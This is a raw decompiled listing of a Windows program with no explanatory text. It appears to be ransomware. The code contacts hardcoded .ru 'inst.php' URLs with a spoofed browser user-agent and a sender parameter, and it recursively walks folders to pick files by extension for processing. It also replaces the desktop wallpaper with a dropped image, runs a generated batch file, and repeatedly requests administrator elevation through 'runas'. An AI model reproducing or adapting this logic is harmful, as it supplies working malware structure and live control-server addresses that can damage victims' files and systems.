  local_10 = (undefined4 *)0x0;
  puStack36 = (undefined *)0x437284;
  local_c = param_2;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack40 = &LAB_00437332;
  uStack44 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack44;
  uStack48 = 0x43729f;
  puStack36 = &stack0xfffffffc;
  FUN_00404d98((int *)&local_10,4);
  uStack48 = 0;
  uStack52 = 0;
  uStack56 = 0;
  uStack60 = 0;
  pcStack64 = 
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
  ;
  puStack68 = (undefined *)0x4372b1;
  InternetOpenA();
  puStack72 = &LAB_004372ff;
  uStack76 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack76;
  puStack68 = &stack0xfffffffc;
  FUN_00404c68(local_8);
  uVar1 = InternetOpenUrlA();
  thunk_FUN_00404c74((int *)&local_10);
  InternetReadFile();
  InternetCloseHandle();
  *in_FS_OFFSET = uVar1;
  FUN_004047fc(local_c,local_10);
  *in_FS_OFFSET = 4;
  FUN_004047a8((int *)&local_10);
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_004373b0(void)

{
  undefined4 uVar1;
  char *pcVar2;
  undefined4 *in_FS_OFFSET;
  undefined uVar3;
  undefined4 uStackY96;
  char *pcStackY92;
  char **ppcVar4;
  undefined *puStack84;
  undefined4 uStack68;
  undefined *puStack64;
  undefined4 uStack56;
  undefined *puStack52;
  undefined *puStack48;
  int *local_20;
  int *local_1c;
  int *local_18;
  int *local_14;
  int *local_10;
  char *local_c;
  uint *local_8;
  
  puStack48 = &stack0xfffffffc;
  local_8 = (uint *)0x0;
  local_c = (char *)0x0;
  local_10 = (int *)0x0;
  local_14 = (int *)0x0;
  local_18 = (int *)0x0;
  local_1c = (int *)0x0;
  local_20 = (int *)0x0;
  uVar3 = 1;
  puStack52 = &LAB_00437771;
  uStack56 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack56;
  FUN_004047a8((int *)&local_8);
  FUN_00404bb4(local_8,(uint *)&DAT_00437788);
  if (!(bool)uVar3) {
    FUN_00404840((int *)&local_c,
                 (int)
                 "http://shopping-na-divane.ru/system/logs/tool/inst.php|||22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222"
                );
    ppcVar4 = &local_c;
    puStack64 = (undefined *)0x437406;
    pcVar2 = FUN_00404d50("|||",local_c);
    puStack64 = (undefined *)0x437416;
    FUN_00404cc8((int)local_c,1,(uint)(pcVar2 + -1),(int *)ppcVar4);
    uVar3 = local_c == (char *)0x0;
    if (!(bool)uVar3) {
      puStack64 = &LAB_00437470;
      uStack68 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStack68;
      puStack84 = &DAT_00437888;
      pcStackY92 = "&sender=";
      uStackY96 = DAT_00443380;
      FUN_00404b28(&local_10,7);
      FUN_00437268((undefined *)local_10,(int *)&local_8);
      uVar3 = 1;
      *in_FS_OFFSET = uStackY96;
    }
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00437788);
  if (!(bool)uVar3) {
    FUN_004047a8((int *)&local_8);
    FUN_00404840((int *)&local_c,
                 (int)
                 "http://shoptorgvlg.ru/system/logs/tool/inst.php|||333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333"
                );
    ppcVar4 = &local_c;
    pcStackY92 = (char *)0x4374bb;
    pcVar2 = FUN_00404d50("|||",local_c);
    pcStackY92 = (char *)0x4374cb;
    FUN_00404cc8((int)local_c,1,(uint)(pcVar2 + -1),(int *)ppcVar4);
    uVar3 = local_c == (char *)0x0;
    if (!(bool)uVar3) {
      pcStackY92 = &LAB_00437525;
      uStackY96 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStackY96;
      uVar1 = DAT_00443380;
      FUN_00404b28(&local_14,7);
      FUN_00437268((undefined *)local_14,(int *)&local_8);
      uVar3 = 1;
      *in_FS_OFFSET = uVar1;
    }
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00437788);
  if (!(bool)uVar3) {
    FUN_004047a8((int *)&local_8);
    FUN_00404840((int *)&local_c,
                 (int)
                 "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444"
                );
    ppcVar4 = &local_c;
    pcStackY92 = (char *)0x437570;
    pcVar2 = FUN_00404d50("|||",local_c);
    pcStackY92 = (char *)0x437580;
    FUN_00404cc8((int)local_c,1,(uint)(pcVar2 + -1),(int *)ppcVar4);
    uVar3 = local_c == (char *)0x0;
    if (!(bool)uVar3) {
      pcStackY92 = &LAB_004375da;
      uStackY96 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStackY96;
      uVar1 = DAT_00443380;
      FUN_00404b28(&local_18,7);
      FUN_00437268((undefined *)local_18,(int *)&local_8);
      uVar3 = 1;
      *in_FS_OFFSET = uVar1;
    }
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00437788);
  if (!(bool)uVar3) {
    FUN_004047a8((int *)&local_8);
    FUN_00404840((int *)&local_c,
                 (int)
                 "55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555"
                );
    ppcVar4 = &local_c;
    pcStackY92 = (char *)0x437625;
    pcVar2 = FUN_00404d50("|||",local_c);
    pcStackY92 = (char *)0x437635;
    FUN_00404cc8((int)local_c,1,(uint)(pcVar2 + -1),(int *)ppcVar4);
    uVar3 = local_c == (char *)0x0;
    if (!(bool)uVar3) {
      pcStackY92 = &LAB_0043768f;
      uStackY96 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStackY96;
      uVar1 = DAT_00443380;
      FUN_00404b28(&local_1c,7);
      FUN_00437268((undefined *)local_1c,(int *)&local_8);
      uVar3 = 1;
      *in_FS_OFFSET = uVar1;
    }
  }
  FUN_00404bb4(local_8,(uint *)&DAT_00437788);
  if (!(bool)uVar3) {
    FUN_004047a8((int *)&local_8);
    FUN_00404840((int *)&local_c,
                 (int)
                 "66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666"
                );
    ppcVar4 = &local_c;
    pcStackY92 = (char *)0x4376da;
    pcVar2 = FUN_00404d50("|||",local_c);
    pcStackY92 = (char *)0x4376ea;
    FUN_00404cc8((int)local_c,1,(uint)(pcVar2 + -1),(int *)ppcVar4);
    if (local_c != (char *)0x0) {
      pcStackY92 = &LAB_00437744;
      uStackY96 = *in_FS_OFFSET;
      *in_FS_OFFSET = &uStackY96;
      uVar1 = DAT_00443380;
      FUN_00404b28(&local_20,7);
      FUN_00437268((undefined *)local_20,(int *)&local_8);
      *in_FS_OFFSET = uVar1;
    }
  }
  *in_FS_OFFSET = puStack84;
  FUN_004047cc((int *)&local_20,7);
  return;
}



void FUN_00437bf4(undefined *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack56;
  undefined *puStack52;
  undefined *puStack48;
  undefined4 uStack44;
  undefined *puStack40;
  undefined *puStack36;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  int local_10;
  int *local_c;
  int *local_8;
  
  puStack24 = &stack0xfffffffc;
  local_10 = 0;
  puStack28 = &LAB_00437cd0;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  puStack36 = (undefined *)0x437c1c;
  local_8 = FUN_00421164((int *)&PTR_LAB_00420efc,'\x01',param_3);
  puStack40 = &LAB_00437cb3;
  uStack44 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack44;
  *(undefined *)((int)local_8 + 0x3f) = 100;
  puStack48 = (undefined *)0x437c3e;
  puStack36 = &stack0xfffffffc;
  (**(code **)(*local_8 + 0x4c))(local_8,param_1);
  puStack48 = (undefined *)0x437c4a;
  local_c = FUN_0041ebb4((int *)&LAB_004195f0,'\x01',extraout_ECX);
  puStack52 = &LAB_00437c96;
  uStack56 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack56;
  puStack48 = &stack0xfffffffc;
  (**(code **)(*local_c + 8))(local_c,local_8);
  FUN_004087a8(param_1,(undefined4 *)&DAT_00437ce4,&local_10);
  (**(code **)(*local_c + 0x50))(local_c,local_10);
  *in_FS_OFFSET = uStack56;
  puStack48 = &LAB_00437c9d;
  puStack52 = (undefined *)0x437c95;
  FUN_00403b24(local_c);
  return;
}



void FUN_00437cec(undefined *param_1,undefined *param_2)

{
  int *piVar1;
  
  piVar1 = FUN_00413c40((int *)&PTR_LAB_004113dc,'\x01',DAT_00442660,"RT_RCData",param_1);
  FUN_00413a74((int)piVar1,param_2);
  FUN_00403b24(piVar1);
  return;
}



void FUN_00437d2c(byte *param_1)

{
  HANDLE hObject;
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined uVar2;
  uint *puVar3;
  undefined4 uStack356;
  undefined *puStack352;
  undefined *puStack348;
  uint *local_14c;
  byte *local_148;
  uint *local_144;
  uint *local_140;
  undefined *local_13c;
  byte *local_138;
  uint *local_134;
  undefined4 local_130;
  undefined4 local_10c [65];
  byte *local_8;
  
  local_144 = (uint *)0x0;
  local_14c = (uint *)0x0;
  local_148 = (byte *)0x0;
  local_134 = (uint *)0x0;
  local_140 = (uint *)0x0;
  local_138 = (byte *)0x0;
  local_13c = (undefined *)0x0;
  puStack348 = (undefined *)0x437d6f;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack352 = &LAB_00437e88;
  uStack356 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack356;
  puStack348 = &stack0xfffffffc;
  hObject = (HANDLE)FUN_00434504();
  local_130 = 0x128;
  iVar1 = FUN_00434524();
  while (uVar2 = iVar1 == 0, !(bool)uVar2) {
    FUN_00404a18((int *)&local_13c,local_10c,0x104);
    FUN_00408870(local_13c,(int *)&local_138);
    FUN_00407dd4(local_138,(byte **)&local_134);
    puVar3 = local_134;
    FUN_00407dd4(local_8,(byte **)&local_140);
    FUN_00404bb4(puVar3,local_140);
    if (!(bool)uVar2) {
      FUN_00404a18((int *)&local_148,local_10c,0x104);
      FUN_00407dd4(local_148,(byte **)&local_144);
      puVar3 = local_144;
      FUN_00407dd4(local_8,(byte **)&local_14c);
      FUN_00404bb4(puVar3,local_14c);
    }
    iVar1 = FUN_00434544();
  }
  CloseHandle(hObject);
  *in_FS_OFFSET = uStack356;
  puStack348 = &LAB_00437e8f;
  puStack352 = (undefined *)0x437e7f;
  FUN_004047cc((int *)&local_14c,7);
  puStack352 = (undefined *)0x437e87;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00437e98(undefined *param_1,char param_2)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined *puVar2;
  undefined *puStack28;
  undefined *puStack24;
  undefined *puStack20;
  undefined *local_8;
  
  puStack20 = (undefined *)0x437eab;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack24 = &LAB_00437f34;
  puStack28 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack28;
  puStack20 = &stack0xfffffffc;
  piVar1 = FUN_00434bec((int *)&LAB_00434718,'\x01',(undefined4 *)"Control Panel\\Desktop");
  FUN_00434c80((int)piVar1,0,"Wallpaper",local_8);
  if (param_2 == '\0') {
    puVar2 = &DAT_00437fa0;
    FUN_00434c80((int)piVar1,0,"TileWallpaper",&DAT_00437fa0);
  }
  else {
    puVar2 = &DAT_00437f7c;
    FUN_00434c80((int)piVar1,0,"TileWallpaper",&DAT_00437f7c);
  }
  FUN_00403b24(piVar1);
  SystemParametersInfoA(0x14,0,(PVOID)0x0,2);
  *in_FS_OFFSET = puVar2;
  puStack28 = &LAB_00437f3b;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00437fa4(void)

{
  HANDLE hObject;
  DWORD dwProcessId;
  HANDLE hProcess;
  BOOL BVar1;
  UINT uExitCode;
  
  hObject = (HANDLE)FUN_00434504();
  uExitCode = 0;
  dwProcessId = GetCurrentProcessId();
  hProcess = OpenProcess(1,0,dwProcessId);
  BVar1 = TerminateProcess(hProcess,uExitCode);
  if (BVar1 == 0) {
    CloseHandle(hObject);
  }
  else {
    CloseHandle(hObject);
  }
  return;
}



void FUN_00437ff4(void)

{
  uint uVar1;
  undefined *puVar2;
  LPCSTR lpFile;
  int iVar3;
  undefined4 extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  char **in_FS_OFFSET;
  undefined uVar4;
  undefined *local_234;
  INT local_230;
  int *local_22c;
  undefined *local_228;
  int local_224;
  int *local_220;
  int local_21c;
  int *local_218;
  int local_214;
  int *local_210;
  undefined *local_20c;
  int local_208;
  int *local_204 [5];
  undefined *local_1f0;
  undefined *local_1ec;
  undefined *local_1e8;
  undefined *local_1e4;
  undefined *local_1e0;
  undefined *local_1dc;
  undefined4 *local_1d8;
  undefined4 local_1d4 [82];
  undefined4 uStackY140;
  LPCSTR lpParameters;
  LPCSTR lpDirectory;
  char *pcVar5;
  char *pcStack36;
  undefined *puStack32;
  undefined *puStack28;
  LPCSTR local_8;
  
  puStack28 = &stack0xfffffffc;
  iVar3 = 0x46;
  do {
    local_8 = (LPCSTR)0x0;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  uVar4 = 1;
  puStack32 = &LAB_0043842b;
  pcStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = (char *)&pcStack36;
  FUN_004047fc((int *)&DAT_0044295c,
               (undefined4 *)
               "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
              );
  FUN_00404bb4(DAT_0044295c,
               (uint *)
               "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
              );
  if ((bool)uVar4) {
    FUN_004047a8((int *)&local_8);
    iVar3 = 5;
    do {
      FUN_004029e8();
      uVar1 = FUN_004030c0(0x1a);
      FUN_00404990((int *)&local_1d8,uVar1 & 0xffffff00 | (uint)(byte)((char)uVar1 + 0x41));
      FUN_00404a70((int *)&local_8,local_1d8);
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    iVar3 = FUN_00437d2c((byte *)"explorer.exe");
    if (iVar3 < 1) {
      ShellExecuteA((HWND)0x0,(LPCSTR)0x0,"explorer.exe",(LPCSTR)0x0,(LPCSTR)0x0,1);
    }
    FUN_00402988(0,(int *)&local_1e0);
    FUN_0040883c(local_1e0,(int *)&local_1dc);
    FUN_00404a70((int *)&local_1dc,(undefined4 *)"desk.jpg");
    FUN_00437cec(&DAT_00438628,local_1dc);
    pcVar5 = *in_FS_OFFSET;
    *in_FS_OFFSET = &stack0xffffffd0;
    FUN_00402988(0,(int *)&local_1e8);
    FUN_0040883c(local_1e8,(int *)&local_1e4);
    FUN_00404a70((int *)&local_1e4,(undefined4 *)"desk.jpg");
    FUN_00437bf4(local_1e4,extraout_EDX,extraout_ECX);
    FUN_00402988(0,(int *)&local_1f0);
    FUN_0040883c(local_1f0,(int *)&local_1ec);
    FUN_00404a70((int *)&local_1ec,(undefined4 *)"desk.bmp");
    FUN_00437e98(local_1ec,'\0');
    *in_FS_OFFSET = pcVar5;
  }
  *in_FS_OFFSET = &stack0xffffffd0;
  FUN_00402988(0,(int *)&local_20c);
  FUN_0040883c(local_20c,&local_208);
  FUN_00404b28(local_204,3);
  FUN_00402d24(local_1d4,(undefined *)local_204[0]);
  FUN_00402ab4((undefined *)local_1d4);
  FUN_004027bc();
  FUN_00402ac0((undefined *)local_1d4);
  FUN_004027bc();
  puVar2 = (undefined *)FUN_00404dfc((undefined *)local_1d4,"chcp 1251 > nul ");
  FUN_0040360c(puVar2,extraout_EDX_00,extraout_ECX_00);
  FUN_004027bc();
  puVar2 = (undefined *)FUN_00404dfc((undefined *)local_1d4,&DAT_0043868c);
  FUN_0040360c(puVar2,extraout_EDX_01,extraout_ECX_01);
  FUN_004027bc();
  FUN_00402988(0,&local_214);
  FUN_00404b28(&local_210,3);
  puVar2 = (undefined *)FUN_00404dfc((undefined *)local_1d4,(undefined *)local_210);
  FUN_0040360c(puVar2,extraout_EDX_02,extraout_ECX_02);
  FUN_004027bc();
  FUN_00402988(0,&local_21c);
  FUN_00404b28(&local_218,3);
  puVar2 = (undefined *)FUN_00404dfc((undefined *)local_1d4,(undefined *)local_218);
  FUN_0040360c(puVar2,extraout_EDX_03,extraout_ECX_03);
  FUN_004027bc();
  FUN_00402988(0,(int *)&local_228);
  FUN_0040883c(local_228,&local_224);
  FUN_00404b28(&local_220,4);
  puVar2 = (undefined *)FUN_00404dfc((undefined *)local_1d4,(undefined *)local_220);
  FUN_0040360c(puVar2,extraout_EDX_04,extraout_ECX_04);
  FUN_004027bc();
  FUN_00402ec8((undefined *)local_1d4);
  FUN_004027bc();
  FUN_00402988(0,(int *)&local_234);
  FUN_0040883c(local_234,&local_230);
  lpParameters = ".bat";
  lpDirectory = local_8;
  FUN_00404b28(&local_22c,3);
  lpFile = FUN_00404c68((undefined *)local_22c);
  uStackY140 = 0x4383ec;
  ShellExecuteA((HWND)0x0,"open",lpFile,lpParameters,lpDirectory,local_230);
  *in_FS_OFFSET = (char *)0x0;
  FUN_00437fa4();
  *in_FS_OFFSET = ".bat\"";
  FUN_004047cc((int *)&local_234,0x18);
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_004386f0(uint *param_1)

{
  DWORD DVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *in_FS_OFFSET;
  bool bVar4;
  undefined uVar5;
  int local_360 [4];
  undefined *local_350;
  undefined4 *local_34c;
  uint *local_348;
  undefined *local_344;
  uint *local_340;
  uint *local_33c;
  uint *local_338;
  uint *local_334;
  undefined *local_330 [116];
  WORD local_160 [4];
  uint local_158;
  uint *local_154;
  undefined4 uStackY68;
  uint *puStackY60;
  uint *puVar6;
  undefined *puStack52;
  undefined *puStack48;
  undefined *puStack44;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  uint *local_8;
  
  puStack44 = &stack0xfffffffc;
  iVar2 = 0x6b;
  do {
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puStack32 = (undefined *)0x43870e;
  local_8 = param_1;
  FUN_00404c58((int)param_1);
  puStack32 = (undefined *)0x43871f;
  FUN_00405100((int)local_160,(int)&DAT_00407150);
  puStack36 = &LAB_00438a39;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  bVar4 = true;
  puStack48 = &LAB_00438917;
  puStack52 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack52;
  puStack32 = &stack0xfffffffc;
  FUN_00404bb4(local_8,DAT_00442964);
  if (!bVar4) {
    iVar2 = FUN_00404a68((int)local_8);
    if (*(char *)((int)local_8 + iVar2 + -1) != '\\') {
      FUN_00404a70((int *)&local_8,(undefined4 *)&DAT_00438a50);
    }
    puStackY60 = (uint *)0x438775;
    SetErrorMode(1);
    FUN_00404ab4((int *)local_330,local_8,(undefined4 *)&DAT_00438a5c);
    DVar1 = FUN_004086a4(local_330[0],0x3f,local_160);
    bVar4 = DVar1 == 0;
    if (bVar4) {
      do {
        FUN_00404bb4(local_154,(uint *)&DAT_00438a68);
        if (!bVar4) {
          FUN_00404bb4(local_154,(uint *)&DAT_00438a74);
          if (!bVar4) {
            if ((local_158 & 0x10) == 0x10) {
              puStackY60 = local_154;
              puStack52 = &DAT_00438a50;
              uStackY68 = 0x4387fe;
              FUN_00404b28((int **)&local_334,3);
              uStackY68 = 0x438809;
              FUN_004386f0(local_334);
            }
            else {
              FUN_00404ab4((int *)&local_338,local_8,local_154);
              uVar5 = 1;
              puStackY60 = (uint *)0x438836;
              puVar6 = local_338;
              FUN_00402988(0,(int *)&local_33c);
              FUN_00404bb4(puVar6,local_33c);
              if (!(bool)uVar5) {
                if (DAT_00442f68 == 0) {
                  bVar4 = true;
                }
                else {
                  bVar4 = false;
                  uVar5 = DAT_00442f68 == 0;
                  if (0 < DAT_00442f68) {
                    puVar3 = &DAT_00442c40;
                    iVar2 = DAT_00442f68;
                    do {
                      FUN_004088a8((undefined *)local_154,(int *)&local_344);
                      FUN_00407ee4(local_344,(LPSTR *)&local_340);
                      puStackY60 = (uint *)0x43889c;
                      puVar6 = local_340;
                      FUN_00407ee4((undefined *)*puVar3,(LPSTR *)&local_34c);
                      puStackY60 = (uint *)0x4388b2;
                      FUN_00404ab4((int *)&local_348,(undefined4 *)&DAT_00438a68,local_34c);
                      FUN_00404bb4(puVar6,local_348);
                      if ((bool)uVar5) {
                        bVar4 = true;
                      }
                      puVar3 = puVar3 + 1;
                      iVar2 = iVar2 + -1;
                      uVar5 = iVar2 == 0;
                    } while (!(bool)uVar5);
                  }
                }
                if (bVar4) {
                  FUN_00404ab4((int *)&local_350,local_8,local_154);
                  FUN_0043681c(local_350);
                }
              }
            }
          }
        }
        iVar2 = FUN_004086f4(local_160);
        bVar4 = iVar2 == 0;
      } while (bVar4);
      FUN_00408718((int)local_160);
    }
  }
  *in_FS_OFFSET = puStack52;
  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_00438a40;
  puStack36 = (undefined *)0x438a1f;
  FUN_004047cc(local_360,0xd);
  puStack36 = (undefined *)0x438a30;
  FUN_004051d0((int)local_160,(int)&DAT_00407150);
  puStack36 = (undefined *)0x438a38;
  FUN_004047a8((int *)&local_8);
  return;
}



// WARNING: Removing unreachable block (ram,0x00438adc)

bool FUN_00438aa0(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  char *lpProcName;
  
  lpProcName = "IsWow64Process";
  hModule = GetModuleHandleA("Kernel32.dll");
  pFVar1 = GetProcAddress(hModule,lpProcName);
  if (pFVar1 != (FARPROC)0x0) {
    GetCurrentProcess();
    (*pFVar1)();
  }
  return false;
}



void FUN_00438b10(int *param_1)

{
  undefined4 auStack268 [66];
  
  GetTempPathA(0x104,(LPSTR)auStack268);
  FUN_00408ae8(auStack268,param_1);
  return;
}



uint FUN_00438b38(void)

{
  HANDLE pvVar1;
  DWORD DVar2;
  int *TokenInformation;
  int iVar3;
  int iVar4;
  DWORD DVar5;
  BOOL BVar6;
  HANDLE *ppvVar7;
  byte local_1c;
  HANDLE local_18;
  DWORD local_14;
  PSID local_10;
  
  local_1c = 0;
  ppvVar7 = &local_18;
  BVar6 = -1;
  DVar5 = 8;
  pvVar1 = GetCurrentThread();
  DVar2 = OpenThreadToken(pvVar1,DVar5,BVar6,ppvVar7);
  DVar5 = DVar2;
  if (DVar2 == 0) {
    DVar5 = GetLastError();
    if (DVar5 == 0x3f0) {
      ppvVar7 = &local_18;
      DVar5 = 8;
      pvVar1 = GetCurrentProcess();
      DVar5 = OpenProcessToken(pvVar1,DVar5,ppvVar7);
      DVar2 = DVar5;
    }
  }
  if (DVar2 != 0) {
    TokenInformation = (int *)FUN_004026a8(0x400);
    BVar6 = GetTokenInformation(local_18,TokenGroups,TokenInformation,0x400,&local_14);
    CloseHandle(local_18);
    if (BVar6 != 0) {
      AllocateAndInitializeSid
                ((PSID_IDENTIFIER_AUTHORITY)&DAT_00441358,'\x02',0x20,0x220,0,0,0,0,0,0,&local_10);
      iVar3 = *TokenInformation;
      if (-1 < iVar3 + -1) {
        iVar4 = 0;
        do {
          BVar6 = EqualSid(local_10,(PSID)TokenInformation[iVar4 * 2 + 1]);
          if (BVar6 != 0) {
            local_1c = 1;
            break;
          }
          iVar4 = iVar4 + 1;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
      }
      FreeSid(local_10);
    }
    DVar5 = FUN_004026c8((int)TokenInformation);
  }
  return DVar5 & 0xffffff00 | (uint)local_1c;
}



void FUN_00438c20(int *param_1)

{
  uint uVar1;
  _OSVERSIONINFOA local_a0;
  
  FUN_004047a8(param_1);
  local_a0.dwOSVersionInfoSize = 0x94;
  uVar1 = GetVersionExA(&local_a0);
  if ((int)local_a0.dwMajorVersion < 0) {
    uVar1 = thunk_FUN_004027b0(uVar1);
  }
  if ((int)local_a0.dwMinorVersion < 0) {
    thunk_FUN_004027b0(uVar1);
  }
  if ((int)local_a0.dwPlatformId < 0) {
    local_a0.dwPlatformId = thunk_FUN_004027b0(local_a0.dwPlatformId);
  }
  if (((local_a0.dwMajorVersion == 4) && (local_a0.dwMinorVersion == 0)) &&
     (local_a0.dwPlatformId == 1)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 95");
  }
  if ((local_a0.dwMajorVersion == 4) && (local_a0.dwMinorVersion == 10)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 98");
  }
  if ((local_a0.dwMajorVersion == 4) && (local_a0.dwMinorVersion == 0x5a)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows Me");
  }
  if ((local_a0.dwMajorVersion == 3) && (local_a0.dwMinorVersion == 0x33)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows NT 3.51");
  }
  if ((local_a0.dwMajorVersion == 4) && (local_a0.dwMinorVersion == 0)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows NT 4.0");
  }
  if ((local_a0.dwMajorVersion == 5) && (local_a0.dwMinorVersion == 0)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 2000");
  }
  if ((local_a0.dwMajorVersion == 5) && (local_a0.dwMinorVersion == 1)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows XP");
  }
  if ((local_a0.dwMajorVersion == 6) && (local_a0.dwMinorVersion == 0)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows Vista");
  }
  if ((local_a0.dwMajorVersion == 6) && (local_a0.dwMinorVersion == 1)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 7");
  }
  if ((local_a0.dwMajorVersion == 6) && (local_a0.dwMinorVersion == 2)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 8");
  }
  if ((local_a0.dwMajorVersion == 6) && (local_a0.dwMinorVersion == 3)) {
    FUN_004047fc(param_1,(undefined4 *)"Windows 8.1");
  }
  if (*param_1 == 0) {
    FUN_004047fc(param_1,(undefined4 *)"Windows Server");
  }
  return;
}



void FUN_00438e78(undefined4 param_1,undefined *param_2,undefined *param_3)

{
  BOOL BVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack88;
  undefined *puStack84;
  undefined *puStack80;
  SHELLEXECUTEINFOA local_48;
  undefined *local_c;
  undefined *local_8;
  
  puStack80 = (undefined *)0x438e8d;
  local_c = param_3;
  local_8 = param_2;
  FUN_00404c58((int)param_2);
  puStack80 = (undefined *)0x438e95;
  FUN_00404c58((int)local_c);
  puStack84 = &LAB_00438f1f;
  uStack88 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack88;
  puStack80 = &stack0xfffffffc;
  FUN_004030a0(&local_48.cbSize,0x3c,0);
  local_48.cbSize = 0x3c;
  local_48.hwnd = GetFocus();
  local_48.fMask = 0x500;
  local_48.lpVerb = "runas";
  local_48.lpFile = FUN_00404c68(local_8);
  local_48.lpParameters = FUN_00404c68(local_c);
  local_48.nShow = 1;
  while( true ) {
    BVar1 = ShellExecuteExA(&local_48);
    if (BVar1 != 0) break;
    Sleep(2000);
  }
  *in_FS_OFFSET = uStack88;
  puStack80 = &LAB_00438f26;
  puStack84 = (undefined *)0x438f1e;
  FUN_004047cc((int *)&local_c,2);
  return;
}



// WARNING: Removing unreachable block (ram,0x0043945b)

void FUN_00438f34(void)

{
  bool bVar1;
  char cVar2;
  uint uVar3;
  char *pcVar4;
  undefined4 uVar5;
  LPCSTR lpFile;
  int iVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  uint extraout_EDX;
  uint *extraout_EDX_00;
  uint *puVar7;
  char *unaff_EBX;
  undefined4 *in_FS_OFFSET;
  undefined uVar8;
  undefined *local_444;
  undefined4 *local_440;
  undefined *local_43c;
  undefined *local_438;
  undefined4 *local_434;
  undefined *local_430;
  undefined *local_42c;
  undefined4 *local_428;
  undefined *local_424;
  undefined *local_420;
  uint *local_41c;
  undefined *local_418;
  byte *local_414;
  uint *local_410 [68];
  int local_300 [2];
  undefined *local_2f8;
  undefined4 *local_2f4;
  undefined *local_2f0;
  undefined *local_2ec;
  undefined4 *local_2e8;
  undefined *local_2e4;
  uint *local_2e0;
  undefined *local_2dc;
  undefined4 *local_2d8;
  undefined *local_2d4;
  undefined *local_2d0;
  undefined4 *local_2cc;
  undefined *local_2c8;
  undefined *local_2c4;
  undefined *local_2c0;
  uint *local_2bc;
  undefined *local_2b8;
  uint *local_2b4;
  int local_2b0;
  HANDLE local_2ac [83];
  HANDLE local_160 [69];
  undefined4 uStackY76;
  LPCSTR lpParameters;
  LPCSTR lpDirectory;
  INT nShowCmd;
  undefined *puStack48;
  int *piVar9;
